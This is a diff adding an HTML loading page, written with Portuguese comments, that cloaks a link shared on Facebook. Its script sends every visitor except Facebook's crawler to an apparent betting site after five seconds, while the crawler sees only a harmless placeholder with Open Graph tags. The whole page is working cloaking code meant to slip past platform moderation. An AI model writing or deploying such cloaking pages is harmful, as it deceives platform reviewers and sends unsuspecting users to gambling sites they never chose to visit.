@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta property="og:title" content="Minha Página Final">
+    <meta property="og:description" content="Esta é a página de carregamento final para o Facebook Crawler.">
+    <meta property="og:image" content="/mnt/data/393.avif"> <!-- Caminho para a imagem do logo -->
+    <meta property="og:url" content="https://393bet14.com/?id=170336285"> <!-- URL da página de carregamento -->
+    <title></title>
+    <style>
+        /* Estilo para a tela de carregamento */
+        .loading-screen {
+            display: flex;
+            flex-direction: column; /* Para alinhar logo e texto verticalmente */
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #6b53a2; /* Cor de fundo */
+            color: white; /* Texto em branco para melhor contraste */
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center; /* Centralizar texto em telas menores */
+            padding: 20px; /* Adiciona padding para melhorar a responsividade */
+            box-sizing: border-box; /* Inclui padding e borda no cálculo do tamanho total */
+        }
+
+        .loading-logo {
+            max-width: 200px; /* Tamanho máximo da imagem */
+            width: 100%; /* Ajusta o tamanho da imagem conforme o contêiner */
+            margin-bottom: 20px; /* Espaço entre a imagem e o texto */
+        }
+
+        /* Estilos responsivos adicionais (opcional) */
+        @media (max-width: 600px) {
+            .loading-screen {
+                font-size: 20px; /* Reduz o tamanho da fonte em dispositivos menores */
+            }
+
+            .loading-logo {
+                max-width: 150px; /* Reduz o tamanho da logo em dispositivos menores */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen">
+        <img src="./mnt/data/393.avif" alt="Logo" class="loading-logo">
+    </div>
+
+    <script>
+        // Função para detectar o Facebook Crawler e bloquear o redirecionamento
+        if (!navigator.userAgent.includes("facebookexternalhit")) {
+            // Redirecionar após 5 segundos se não for o Facebook Crawler
+            setTimeout(function() {
+                window.location.href = 'https://393bet14.com/?id=170336285'; // Substitua pelo link desejado
+            }, 5000); // 5000 milissegundos = 5 segundos
+        }
+    </script>
+</body>
+</html>
